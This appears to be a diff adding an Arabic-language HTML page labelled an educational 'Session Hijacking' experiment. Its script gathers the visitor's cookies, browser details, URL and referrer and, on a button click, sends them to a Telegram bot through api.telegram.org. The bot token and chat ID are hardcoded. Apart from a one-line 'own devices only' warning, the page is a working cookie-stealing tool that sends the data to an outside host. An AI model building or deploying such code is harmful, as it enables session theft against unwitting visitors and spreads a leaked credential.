@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Session Hijacking – تجربة تعليمية</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(145deg, #0b0e1a 0%, #1a1f33 100%);
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            color: #fff;
+        }
+        .container {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border-radius: 48px;
+            padding: 30px 24px;
+            max-width: 440px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.08);
+            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
+            text-align: center;
+        }
+        h1 {
+            font-size: 26px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #f9d976, #f39c12);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+        }
+        .sub {
+            color: #aab;
+            font-size: 14px;
+            margin-bottom: 24px;
+            opacity: 0.8;
+        }
+        .info-box {
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            padding: 16px;
+            margin: 16px 0;
+            border: 1px solid rgba(255,255,255,0.05);
+            text-align: left;
+            font-size: 13px;
+            color: #ccc;
+            word-break: break-all;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .info-box strong {
+            color: #f9d976;
+        }
+        .action-btn {
+            width: 100%;
+            padding: 18px 0;
+            border: none;
+            border-radius: 60px;
+            background: linear-gradient(135deg, #f9d976, #f39c12);
+            color: #0b0e1a;
+            font-size: 22px;
+            font-weight: 800;
+            cursor: pointer;
+            margin: 8px 0 16px 0;
+            transition: 0.3s;
+            box-shadow: 0 8px 25px rgba(243, 156, 18, 0.25);
+        }
+        .action-btn:disabled {
+            opacity: 0.4;
+            transform: scale(0.97);
+            pointer-events: none;
+        }
+        .action-btn:active {
+            transform: scale(0.96);
+        }
+        #status {
+            margin-top: 16px;
+            font-size: 15px;
+            color: #aab;
+            min-height: 24px;
+        }
+        .badge {
+            display: inline-block;
+            background: rgba(0,255,0,0.1);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #0f0;
+            margin-top: 8px;
+        }
+        .note {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #556;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            padding-top: 15px;
+        }
+        .warning {
+            color: #f00;
+            font-weight: bold;
+            background: rgba(255,0,0,0.1);
+            padding: 8px;
+            border-radius: 12px;
+            margin: 8px 0;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🔐 Session Hijacking</h1>
+    <p class="sub">تجربة تعليمية لجلب ملفات تعريف الارتباط وإرسالها لبوت تيليجرام</p>
+
+    <div class="warning">⚠️ استخدم هذا فقط على أجهزتك الخاصة لأغراض تعليمية.</div>
+
+    <button class="action-btn" id="captureBtn">📨 التقاط وإرسال الكوكيز</button>
+
+    <div id="status">📌 اضغط على الزر لبدء العملية</div>
+
+    <div class="info-box" id="cookieDisplay">
+        <strong>🍪 الكوكيز:</strong> <span id="cookieValue">(لم تُلتقط بعد)</span>
+    </div>
+    <div class="info-box" id="infoDisplay">
+        <strong>📱 معلومات إضافية:</strong><br>
+        <span id="extraInfo">(سيتم جمعها عند النقر)</span>
+    </div>
+
+    <div class="badge" id="telegramStatus">📨 جاهز</div>
+    <div class="note">⚡ سيتم إرسال البيانات إلى المعرف الثابت في تيليجرام</div>
+</div>
+
+<script>
+    // ================================
+    // المعرفات الثابتة (استبدلها بما يناسبك)
+    // ================================
+    const BOT_TOKEN = "6921714346:AAFqRm4MvsBxL8KOVaXOUcoWwhKQTdskDWc";
+    const TARGET_CHAT_ID = "8169635171";
+
+    // ================================
+    // عناصر الواجهة
+    // ================================
+    const captureBtn = document.getElementById('captureBtn');
+    const statusDiv = document.getElementById('status');
+    const cookieValueSpan = document.getElementById('cookieValue');
+    const extraInfoSpan = document.getElementById('extraInfo');
+    const telegramStatus = document.getElementById('telegramStatus');
+
+    // ================================
+    // الدوال الأساسية
+    // ================================
+
+    // جمع البيانات
+    function collectData() {
+        const cookies = document.cookie || 'لا توجد كوكيز (قد تكون HttpOnly)';
+        const userAgent = navigator.userAgent;
+        const url = window.location.href;
+        const referrer = document.referrer || 'لا يوجد';
+        const screen = `${window.screen.width}x${window.screen.height}`;
+        const language = navigator.language || 'غير معروف';
+        const platform = navigator.platform || 'غير معروف';
+        const timestamp = new Date().toLocaleString('ar-EG');
+
+        return {
+            cookies,
+            userAgent,
+            url,
+            referrer,
+            screen,
+            language,
+            platform,
+            timestamp
+        };
+    }
+
+    // عرض البيانات في الواجهة
+    function displayData(data) {
+        cookieValueSpan.textContent = data.cookies;
+        extraInfoSpan.innerHTML = `
+            🕒 الوقت: ${data.timestamp}<br>
+            🌐 الرابط: ${data.url}<br>
+            🔗 المرجع: ${data.referrer}<br>
+            📱 المتصفح: ${data.userAgent}<br>
+            🖥️ الشاشة: ${data.screen}<br>
+            🌍 اللغة: ${data.language}<br>
+            💻 المنصة: ${data.platform}
+        `;
+    }
+
+    // إرسال البيانات إلى تيليجرام
+    async function sendToTelegram(data) {
+        telegramStatus.textContent = '⏳ جاري الإرسال...';
+        telegramStatus.style.color = '#ff0';
+
+        // بناء رسالة منظمة
+        let message = `🔐 **تقرير Session Hijacking**\n\n`;
+        message += `🍪 **الكوكيز:**\n\`${data.cookies}\`\n\n`;
+        message += `📱 **المتصفح:** ${data.userAgent}\n`;
+        message += `🌐 **الرابط:** ${data.url}\n`;
+        message += `🔗 **المرجع:** ${data.referrer}\n`;
+        message += `🖥️ **الشاشة:** ${data.screen}\n`;
+        message += `🌍 **اللغة:** ${data.language}\n`;
+        message += `💻 **المنصة:** ${data.platform}\n`;
+        message += `🕒 **الوقت:** ${data.timestamp}\n`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const payload = {
+            chat_id: TARGET_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        };
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            const result = await response.json();
+            if (result.ok) {
+                telegramStatus.textContent = '✅ تم الإرسال بنجاح!';
+                telegramStatus.style.color = '#0f0';
+                statusDiv.innerHTML = '✅ اكتمل الإرسال إلى البوت.';
+            } else {
+                telegramStatus.textContent = '❌ فشل الإرسال: ' + (result.description || 'خطأ غير معروف');
+                telegramStatus.style.color = '#f00';
+                statusDiv.innerHTML = '❌ فشل الإرسال. تحقق من التوكن والمعرف.';
+            }
+        } catch (e) {
+            telegramStatus.textContent = '❌ خطأ في الاتصال: ' + e.message;
+            telegramStatus.style.color = '#f00';
+            statusDiv.innerHTML = '❌ خطأ في الاتصال.';
+        }
+    }
+
+    // ================================
+    // معالج زر الالتقاط
+    // ================================
+    captureBtn.addEventListener('click', async function() {
+        captureBtn.disabled = true;
+        statusDiv.innerHTML = '⏳ جاري جمع البيانات...';
+
+        // جمع البيانات
+        const data = collectData();
+        displayData(data);
+
+        statusDiv.innerHTML = '📨 جاري الإرسال إلى تيليجرام...';
+        await sendToTelegram(data);
+
+        captureBtn.disabled = false;
+        statusDiv.innerHTML = '✅ انتهت العملية. يمكنك تكرار التجربة.';
+    });
+
+    // ================================
+    // الحالة الأولية
+    // ================================
+    statusDiv.innerHTML = '📌 اضغط على الزر لبدء العملية';
+    telegramStatus.textContent = '📨 جاهز';
+</script>
+</body>
+</html>
